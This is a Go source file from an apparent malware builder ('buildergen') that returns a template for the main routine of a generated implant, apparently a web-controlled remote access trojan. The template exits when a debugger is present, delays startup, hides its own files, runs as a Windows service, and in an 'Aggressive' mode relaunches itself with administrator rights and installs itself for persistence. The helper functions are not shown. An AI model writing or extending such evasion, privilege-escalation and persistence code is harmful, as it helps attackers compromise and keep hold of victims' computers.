package buildergen

import "strings"

func templateMainFlow() string {
	return strings.TrimSpace(`
func main() {
	if isDebuggerPresent() {
		os.Exit(0)
	}

	applyStartupDelay()

	hideSelfFiles()

	if runtime.GOOS == "windows" {
		isSvc, err := svc.IsWindowsService()
		if err == nil && isSvc {
			_ = svc.Run(getServiceName(), &webratService{})
			return
		}
	}

	if len(os.Args) > 1 && os.Args[1] == "worker" {
		runWorkerGuard()
		return
	}

	forceMode := strings.TrimSpace(forceAdminMode)
	aggressiveMode := strings.EqualFold(forceMode, "Aggressive") || strings.EqualFold(forceMode, "Agressive")
	if shouldEnforceBuildLock() && !(aggressiveMode && !isAdmin()) && !ensureSingleRunPerBuild() {
		return
	}

	if aggressiveMode {
		if shouldEnforceBuildLock() {
			if isAggressiveAlreadyInstalled() {
				return
			}

			if !isAdmin() {
				relaunchAsAdmin()
				return
			}

			if opInstallAll() {
				return
			}
		}

		runPrimaryWithWorker()
		return
	}

	runPrimaryWithWorker()
}
`)
}